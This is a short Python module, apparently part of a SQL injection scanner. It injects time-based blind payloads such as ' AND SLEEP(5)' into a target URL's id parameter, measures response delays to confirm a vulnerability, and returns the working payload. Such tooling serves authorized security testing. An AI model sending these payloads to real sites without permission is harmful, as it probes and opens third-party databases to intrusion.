from Modules.URLUtils import construct_test_url
from Modules.RequestHandler import send_payload
import time

time_based_payloads = [" AND SLEEP({})", "' AND SLEEP({})%23", '" AND SLEEP({})%23']


def test_time_based_sql_injection(target_url, id_value):

    print("\nTesting with Time-based conditions:")
    for payload in time_based_payloads:
        formatted_payload = payload.format(5)
        new_url = construct_test_url(target_url, id_value, formatted_payload)
        start_time = time.time()
        send_payload(new_url)
        response_time = time.time() - start_time

        if response_time >= 5:
            print(f"Initial confirmation: Payload {formatted_payload} caused a significant delay.")
            formatted_payload = payload.format(10)
            new_url = construct_test_url(target_url, id_value, formatted_payload)
            start_time = time.time()
            send_payload(new_url)
            response_time = time.time() - start_time
            if response_time >= 10:
                print(
                    f"Confirmed: Payload '{formatted_payload}' caused a significant delay (likely vulnerable to "
                    f"time-based injection).")

                formatted_payload_no_sleep = formatted_payload.replace('SLEEP(10)', ' ')
                return "time-based", formatted_payload_no_sleep

    return None, None
